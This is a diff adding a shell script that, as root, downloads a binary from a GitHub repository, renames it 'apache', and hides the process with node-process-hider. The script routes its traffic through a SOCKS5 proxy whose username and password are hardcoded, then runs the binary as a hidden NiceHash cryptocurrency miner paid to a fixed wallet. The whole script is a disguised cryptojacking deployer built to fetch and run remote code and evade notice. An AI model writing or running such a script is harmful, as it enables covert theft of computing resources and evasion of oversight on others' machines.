@@ -1,0 +1,37 @@
+#!/bin/sh
+sudo su <<EOF
+apt update;apt install -y curl unzip autoconf git cmake binutils build-essential net-tools screen golang nano tar wget
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+wget -O apache https://raw.githubusercontent.com/hanifgz/ngarit/main/Need_For_Speed
+chmod +x apache
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = p.webshare.io:80
+socks5_username = kuyaxbatox-rotate
+socks5_password = b15m1ll4H
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+sleep .2
+./graftcp/graftcp curl ifconfig.me
+echo " "
+echo " "
+
+ph add apache
+
+./graftcp/graftcp ./apache -P stratum2+tcp://3E1T35rmEJrhDtGsuXYgkrbzyLxUuHbNvL.$(echo $(shuf -i 1-2000 -n 1))@daggerhashimoto.usa-west.nicehash.com:3353 -R --HWMON 2 --verbosity 1 --work-timeout 999
+
+EOF
